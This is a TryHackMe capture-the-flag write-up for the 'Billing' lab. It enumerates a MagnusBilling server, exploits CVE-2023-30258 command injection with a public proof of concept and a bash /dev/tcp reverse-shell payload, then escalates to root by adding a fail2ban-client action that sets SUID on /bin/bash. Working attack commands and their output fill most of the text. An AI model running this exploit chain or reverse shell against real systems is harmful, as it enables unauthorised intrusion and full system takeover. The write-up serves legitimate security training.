---

title: "Billing | TryHackMe Writeup"
date: 2026-09-29T00:01:00+05:30
description: "TryHackMe Billing writeup covering MagnusBilling enumeration, CVE-2023-30258 unauthenticated command injection, remote code execution, reverse shell access, Fail2Ban sudo misconfiguration, malicious Fail2Ban actions, and SUID-based privilege escalation."
summary: "Compromised the Billing machine by exploiting MagnusBilling through CVE-2023-30258 to obtain an unauthenticated remote shell as asterisk, then abusing unrestricted sudo access to fail2ban-client to create a privileged Fail2Ban action that sets the SUID bit on /bin/bash, resulting in effective root privileges."
platform: "tryhackme"
difficulty: "easy"
os: "Linux"
status: "active"
featured: true
featured_image: "/images/writeups/tryhackme/Billing.png"
tags: ["linux", "magnusbilling", "cve-2023-30258", "command-injection", "rce", "remote-code-execution", "reverse-shell", "asterisk", "tty", "sudo", "fail2ban", "fail2ban-client", "sudo-misconfiguration", "suid", "bash", "privilege-escalation"]
skills: ["nmap", "web-enumeration", "magnusbilling", "cve-2023-30258", "python", "rce", "netcat", "reverse-shell", "tty-upgrade", "linux-enumeration", "sudo", "fail2ban", "fail2ban-client", "suid", "bash", "privilege-escalation"]
comments: false
draft: false
------------

## Overview

<img width="842" height="438" alt="billing-tryhackme" src="/images/writeups/tryhackme/Billing.png" />

Billing is an easy TryHackMe machine that focuses on MagnusBilling enumeration, unauthenticated command injection, remote code execution, reverse shell access, sudo misconfiguration, Fail2Ban abuse, and SUID-based privilege escalation.



### Key Vulnerabilities

* MagnusBilling Command Injection
* CVE-2023-30258
* Unauthenticated Remote Code Execution
* Reverse Shell as `asterisk`
* Misconfigured `sudo` Permission
* Unrestricted `fail2ban-client` Execution
* Malicious Fail2Ban Action
* Privileged Command Execution
* SUID `/bin/bash`
* Bash Privilege Escalation


---

## 🔎 Enumeration

First, let's scan the entire target for open TCP ports using **Nmap**.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 10.49.134.12
```

#### Nmap Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 10.49.134.12
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-28 07:33 -0700
Nmap scan report for 10.49.134.12
Host is up (0.034s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 18:1c:27:a6:40:47:43:7b:03:40:7f:45:9a:10:a4:18 (ECDSA)
|_  256 f0:3b:eb:f2:81:26:0f:3c:88:f2:49:f6:c8:c8:8b:16 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://10.49.134.12/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.81 seconds
```

We identified four open ports:

* **22/tcp** — SSH
* **80/tcp** — HTTP
* **3306/tcp** — MySQL/MariaDB
* **5038/tcp** — Asterisk Call Manager

---

## 🌐 Web Enumeration

Let's investigate the web service running on port `80`.

Opening:

```text
http://10.49.134.12
```

<img width="1918" height="938" alt="image" src="https://github.com/user-attachments/assets/c953daf0-6594-4570-a7da-e42715fef26a" />

reveals a `MagnusBilling login page`.

At this point, the exact version of MagnusBilling is not known.

After researching known vulnerabilities affecting MagnusBilling and testing the relevant possibilities, we identified `CVE-2023-30258`.

---

## 💥 MagnusBilling RCE — CVE-2023-30258

`CVE-2023-30258` is a command-injection vulnerability affecting MagnusBilling versions 6.x through 7.3.0.

The vulnerability allows an unauthenticated attacker to execute arbitrary commands remotely through insufficient sanitization of the `democ` parameter in `icepay.php`.

This can ultimately result in `Remote Code Execution (RCE)` on the target system.

### 🔧 Obtaining the Exploit

Download the proof-of-concept:

```bash
wget https://raw.githubusercontent.com/n00o00b/CVE-2023-30258-RCE-POC/refs/heads/main/poc.py
```

---

## 🐚 Getting a Reverse Shell

Before exploiting the vulnerability, start a Netcat listener on the attacking machine.

```bash
nc -lnvp 443
```

Now execute the MagnusBilling exploit and provide a Bash reverse-shell payload:

```bash
python3 poc.py -u http://10.48.128.30/mbilling/ --cmd "bash -c 'bash -i > /dev/tcp/192.168.170.200/443 0>&1'"
```

The reverse shell connects back to the listener:

```text
$ nc -lnvp 443                                            
listening on [any] 443 ...
connect to [192.168.170.200] from (UNKNOWN) [10.48.128.30] 57242
id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
```

We successfully obtained a shell as the **`asterisk`** user.

---

## 🖥️ Reverse Shell TTY Upgrade

The initial reverse shell is not a fully interactive terminal, so let's upgrade it.

Run:

```bash
script /dev/null -c bash
```

Press: `Ctrl + Z`

Then execute:

```bash
stty raw -echo; fg
```

Reset the terminal:

```bash
reset xterm
```

Set the required environment variables:

```bash
export TERM=xterm
export BASH=bash
```

Finally, configure the terminal dimensions:

```bash
stty cols 160 rows 45
```

The reverse shell is now upgraded to a more interactive TTY.

---

## 🔐 Privilege Escalation

Now let's check which commands the `asterisk` user can execute with `sudo`.

```bash
sudo -l
```

Output:

```text
asterisk@ip-10-48-128-30:/$ sudo -l
Matching Defaults entries for asterisk on ip-10-48-128-30:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-48-128-30:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
asterisk@ip-10-48-128-30:/$
```

The important entry is:

```text
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```

This means the `asterisk` user can execute `fail2ban-client` as **any user**, including `root`, without providing a password.

This gives us a potential privilege-escalation path through `Fail2Ban`.

---

## 🧨 Exploiting Fail2Ban

Before exploiting the configuration, let's check whether `/bin/bash` currently has the SUID bit set.

```bash
ls -la /bin/bash
```

Output:

```text
asterisk@ip-10-48-128-30:/$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 18  2025 /bin/bash
asterisk@ip-10-48-128-30:/$
```

The SUID bit is not currently set.

### Creating a Malicious Fail2Ban Action

Create a new action called `evil`:

```bash
sudo /usr/bin/fail2ban-client set sshd addaction evil
```


Verify that the action was successfully added:

```bash
sudo /usr/bin/fail2ban-client get sshd actions
```

Output:

```text
asterisk@ip-10-48-128-30:/$ sudo /usr/bin/fail2ban-client get sshd actions
The jail sshd has the following actions:
iptables-multiport, evil
asterisk@ip-10-48-128-30:/$ 
```

The malicious action has been successfully added.

---

## ⚡ Configuring the Malicious Action

Now configure the `evil` action so that when a ban occurs, it executes: `chmod +s /bin/bash`

Run:

```bash
sudo /usr/bin/fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"
```

The action is now configured.

---

## 🚨 Triggering the Fail2Ban Action

Trigger the ban action by banning an arbitrary IP address:

```bash
sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.5
```

Output:

```text
asterisk@ip-10-48-128-30:/$ sudo /usr/bin/fail2ban-client get sshd actions
The jail sshd has the following actions:
iptables-multiport, evil
asterisk@ip-10-48-128-30:/$ 
```

Now check the permissions of `/bin/bash` again:

```bash
ls -la /bin/bash
```

Output:

```text
asterisk@ip-10-48-128-30:/$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18  2025 /bin/bash
asterisk@ip-10-48-128-30:/$
```

The `s` indicates that the **`SUID` bit is now set**.

Because `/bin/bash` is owned by root, executing it with the `-p` option allows us to preserve the effective UID.

---

## 👑 Getting Root

Execute:

```bash
/bin/bash -p
```

Verify our privileges:

```text
asterisk@ip-10-48-128-30:/$ /bin/bash -p
bash-5.2# id
uid=1001(asterisk) gid=1001(asterisk) euid=0(root) egid=0(root) groups=0(root),1001(asterisk)
bash-5.2#
```

We have successfully obtained **effective `root` privileges**.

---

## 🚩 User Flag

Now retrieve the user flag:

```bash
cat /home/magnus/user.txt
```

Output:

```text
bash-5.2# cat /home/magnus/user.txt 
THM{4a6831d5f124b25eefb1e92e0*******}
```

---

## 🚩 Root Flag

Finally, retrieve the root flag:

```bash
cat /root/root.txt
```

Output:

```text
bash-5.2# cat /root/root.txt 
THM{33ad5b530e71a172648f424ec*******}
```

---

## 🧾 Summary

| Stage                 | Technique                       |
| --------------------- | ------------------------------- |
| Reconnaissance        | Full TCP Nmap scan              |
| Web Enumeration       | MagnusBilling identification    |
| Initial Access        | CVE-2023-30258                  |
| Remote Code Execution | MagnusBilling command injection |
| Shell                 | Reverse shell as `asterisk`     |
| Shell Upgrade         | TTY upgrade                     |
| Privilege Enumeration | `sudo -l`                       |
| Privilege Escalation  | Misconfigured `fail2ban-client` |
| Root Shell            | SUID `/bin/bash`                |
| Final Access          | Root                            |

---

## 🚀 Key Takeaways

* Always perform a **full TCP port scan** during enumeration.
* Don't rely only on the application's version being displayed; investigate known vulnerabilities when version information is unavailable.
* **CVE-2023-30258** can provide unauthenticated RCE in vulnerable MagnusBilling installations.
* After obtaining a shell, always run:` sudo -l`
* `fail2ban-client` should not be unnecessarily granted unrestricted `sudo` privileges.
* A privileged Fail2Ban action can be abused to execute commands with elevated privileges.
* Setting the SUID bit on `/bin/bash` can result in full root access.


---
